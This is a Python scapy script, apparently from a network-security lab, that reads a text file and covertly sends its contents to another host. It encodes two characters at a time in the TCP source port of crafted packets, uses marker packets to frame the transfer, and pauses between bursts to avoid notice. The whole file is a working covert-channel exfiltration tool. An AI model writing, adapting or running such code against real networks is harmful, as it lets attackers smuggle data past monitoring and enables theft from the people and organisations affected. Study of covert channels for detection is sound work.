 #! /usr/bin/env python3

from scapy.all import *
import codecs
import sys
import time

def fileToDecimal():
    fname = 'testFile.txt'
    #open file
    try:
        file = open(fname)
    except OSError:
        print("Could not open/read file: {}".format(fname))
        sys.exit()

    with file:
        content = file.read()
        file.close()
        #save file contents as binary
        binary_of_file_content = ' '.join(format(ord(x), 'b') for x in content)

    #splitting it to a list
    list_of_binary = binary_of_file_content.split()
    #add leading 0s to the binary
    i = 0
    while i < len(list_of_binary): 
        while len(list_of_binary[i]) < 8:
            list_of_binary[i] = "0" + list_of_binary[i]
        i += 1 
    
    #combine 2 characters per packet and 
    #convert the binary to decimal
    finished_decimal_list = []
    j = 0
    while j < len(list_of_binary): 
        if (j % 2) == 0:
            if j+1 < len(list_of_binary):
                #if the number of characters is even
                temp = int(list_of_binary[j] + list_of_binary[j+1], 2)
            else:
                #if the number of characters is odd
                temp = int(list_of_binary[j] + "00000000", 2)
            finished_decimal_list.append(temp)
        j += 1 

    #print(finished_decimal_list)  
    return finished_decimal_list


def main():
    #creates the list of source ports to send
    list_of_decimal = fileToDecimal()
    #seconds between 3 packets
    packet_timeout = 15

    sourceIP = "192.168.30.128"
    destinationIP = "192.168.30.129"

    #initial packet sent with port 32768 to signal the start of the data transfer
    first_packet = IP()/TCP(dport=5433, sport=32768)
    first_packet.src = sourceIP
    first_packet.dst = destinationIP
    print(first_packet.summary())
    send(first_packet)

    #second packet sent with port set to the amount of packets being sent
    second_packet = IP()/TCP(dport=5433, sport=len(list_of_decimal))
    second_packet.src = sourceIP
    second_packet.dst = destinationIP
    print(second_packet.summary())
    send(second_packet)
    packet_counter = 2

    for i in list_of_decimal:
        #create and send the packets one by one
        packet = IP()/TCP(dport=5433, sport=int(i))
        packet.src = sourceIP
        packet.dst = destinationIP
        print(packet.summary())
        send(packet)
        packet_counter += 1
        if packet_counter == 3:
            time.sleep(packet_timeout)
            packet_counter = 0

    #Last packet sent with port 32768 to signal the end of the data transfer
    last_packet = IP()/TCP(dport=5433, sport=32768)
    last_packet.src = sourceIP
    last_packet.dst = destinationIP
    print(last_packet.summary())
    send(last_packet)


if __name__ == "__main__":
    main()